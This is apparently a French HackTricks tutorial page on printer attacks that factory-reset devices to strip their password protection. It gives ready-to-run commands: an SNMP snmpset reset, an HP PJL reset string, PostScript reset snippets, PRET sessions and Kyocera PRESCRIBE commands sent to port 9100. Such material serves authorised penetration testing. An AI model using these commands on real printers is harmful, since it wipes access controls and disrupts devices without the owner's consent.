<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


**R√©initialiser** un appareil aux valeurs d'usine est une fonctionnalit√© critique pour la s√©curit√© car elle **√©crase les m√©canismes de protection** comme les mots de passe d√©finis par l'utilisateur. Cela peut g√©n√©ralement √™tre fait en appuyant sur une **combinaison de touches sp√©ciale** sur le **panneau de contr√¥le** de l'imprimante. Effectuer une telle r√©initialisation √† froid ne prend que quelques secondes et est donc un sc√©nario r√©aliste pour les attaquants locaux ou les pentesters, qui peuvent par exemple se faufiler dans la salle de copie √† l'heure du d√©jeuner. Cependant, l'**acc√®s physique** √† l'appareil **n'est pas toujours une option**.

### SNMP

Le Printer-MIB d√©finit l'objet **prtGeneralReset** (**OID 1.3.6.1.2.1.43.5.1.1.3.1**) qui permet √† un attaquant de red√©marrer l'appareil (powerCycleReset(4)), de r√©initialiser les param√®tres NVRAM (resetToNVRAM(5)) ou de restaurer les valeurs d'usine (resetToFactoryDefaults(6)) √† l'aide de SNMP. Cette fonctionnalit√©/attaque est **prise en charge par une grande vari√©t√© d'imprimantes** et supprime tous les m√©canismes de protection comme les mots de passe d√©finis par l'utilisateur pour le serveur web embarqu√©. Bien que les m√©canismes de protection puissent √™tre contourn√©s efficacement, un inconv√©nient pratique de cette approche est que toute la configuration **d'adresse IP statique sera perdue**. **Si aucun service DHCP** n'est disponible, l'attaquant ne pourra **pas** se **reconnecter** √† l'appareil apr√®s l'avoir r√©initialis√© aux valeurs d'usine.

**R√©initialiser l'appareil aux valeurs d'usine** peut √™tre accompli en utilisant la commande `snmpset` comme indiqu√© ci-dessous (vous devez conna√Ætre la **cha√Æne de communaut√©**, par d√©faut dans la plupart des cas c'est `public`) :
```bash
snmpset -v1 -c public printer 1.3.6.1.2.1.43.5.1.1.3.1 i 6
```
### [PML](./#pml)/[PJL](./#pjl)

Dans de nombreux sc√©narios, un attaquant n'a pas la capacit√© d'effectuer des requ√™tes SNMP √† cause de pare-feu ou de cha√Ænes de communaut√© SNMP inconnues. Cependant, sur les **appareils HP**, le **SNMP** peut √™tre transform√© en sa **repr√©sentation PML** et int√©grer la requ√™te dans un travail d'impression l√©gitime. Cela permet √† un attaquant de **red√©marrer et/ou r√©initialiser l'appareil** aux param√®tres d'usine par le biais de travaux d'impression ordinaires comme illustr√© ci-dessous :
```bash
@PJL DMCMD ASCIIHEX="040006020501010301040106"
```
Toute personne peut reproduire cette attaque sur les imprimantes HP, le red√©marrage ou la r√©initialisation de l'appareil peut facilement √™tre reproduit en utilisant [**PRET**](https://github.com/RUB-NDS/PRET) :
```bash
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> reset
printer:/> restart
```
### PostScript

PostScript offre une fonctionnalit√© similaire : le param√®tre syst√®me **FactoryDefaults**, 'un drapeau qui, s'il est **d√©fini sur vrai** **imm√©diatement avant** que **l'imprimante soit √©teinte**, entra√Æne la r√©initialisation de tous les param√®tres non volatils √† leurs valeurs par **d√©faut d'usine** lors de la prochaine mise sous tension'. Il faut noter que **PostScript** lui-m√™me a √©galement la capacit√© de **red√©marrer** son **environnement** mais cela n√©cessite un **mot de passe valide**. \
Cependant, l'interpr√©teur PostScript peut √™tre mis dans une **boucle infinie** comme discut√© dans les attaques DoS de [traitement de documents](http://hacking-printers.net/wiki/index.php/Document\_processing) ce qui oblige l'utilisateur √† **red√©marrer manuellement** l'appareil et donc √† r√©initialiser le mot de passe PostScript.

R√©initialiser les param√®tres syst√®me PostScript aux valeurs par d√©faut d'usine :
```bash
<< /FactoryDefaults true >> setsystemparams
```
Red√©marrez l'interpr√©teur PostScript et la m√©moire virtuelle :
```bash
true 0 startjob systemdict /quit get exec
```
Toute personne pouvant red√©marrer ou r√©initialiser l'interpr√©teur PostScript d'une imprimante peut **√™tre facilement reproduite en utilisant** [**PRET**](https://github.com/RUB-NDS/PRET) :
```bash
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> reset
printer:/> restart
```
### PRESCRIBE

Pour les **appareils Kyocera**, les langages de description de page **PRESCRIBE** peuvent √™tre utilis√©s pour **r√©initialiser l'appareil** aux param√®tres d'usine par d√©faut √† partir de travaux d'impression ordinaires en utilisant l'une des commandes ci-dessous :
```bash
!R! KSUS "AUIO", "CUSTOM:Admin Password = 'admin00'";  CMMT "Drop the security level, reset password";
!R! ACNT "REST";                                       CMMT "Reset account code admin password";
!R! EGRE;                                              CMMT "Reset the engine board to factory defaults";
!R! SIOP0,"RESET:0";                                   CMMT "Reset configuration settings";
```
Pour reproduire cette attaque, ouvrez une connexion r√©seau brute sur le port 9100/tcp de l'imprimante et **envoyez les commandes document√©es ci-dessus**.

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
